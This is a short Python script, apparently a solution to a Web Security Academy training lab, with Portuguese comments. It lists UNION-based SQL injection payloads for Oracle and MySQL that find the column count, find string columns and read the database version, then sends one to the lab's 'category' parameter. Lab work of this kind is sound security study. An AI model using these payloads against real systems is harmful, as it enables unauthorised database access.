import requests

# Parâmetro vulnerável: category

# PAYLOADS - ORACLE
# Descobrindo nº de colunas da tabela da consulta original
sqli_1 = "' ORDER BY 1--" # OK!
sqli_2 = "' ORDER BY 2--" # OK!
sqli_3 = "' ORDER BY 3--" # Erro! Tabela original tem 2 colunas
# Descobrindo colunas do tipo string da tabela da consulta original
sqli_4 = "' UNION SELECT 'a',NULL FROM dual--" # OK! 1ª coluna tipo string 
sqli_5 = "' UNION SELECT NULL,'a' FROM dual--" # OK! 2ª coluna tipo string 
# Ataque 
sqli_6 = "' UNION SELECT banner,NULL FROM v$version--"

# PAYLOADS - MySQL
# Descobrindo nº de colunas na consulta original
sqli_7 = "' ORDER BY 1#" # OK!
sqli_8 = "' ORDER BY 2#" # OK!
sqli_9 = "' ORDER BY 3#" # Erro! Tabela original tem 2 colunas
# Descobrindo colunas do tipo string da tabela da consulta original
sqli_10 = "' UNION SELECT 'a',NULL#" # OK! 1ª coluna tipo string 
sqli_11 = "' UNION SELECT NULL,'a'#" # OK! 2ª coluna tipo string 
# Ataque 
sqli_12 = "' UNION SELECT @@version,NULL#"

url = 'https://0a1f00df03a26a5b83490247000500d0.web-security-academy.net/filter'
params = {
    "category": "Gifts" + sqli_12
}
response = requests.get(url, params=params)

print(response.text)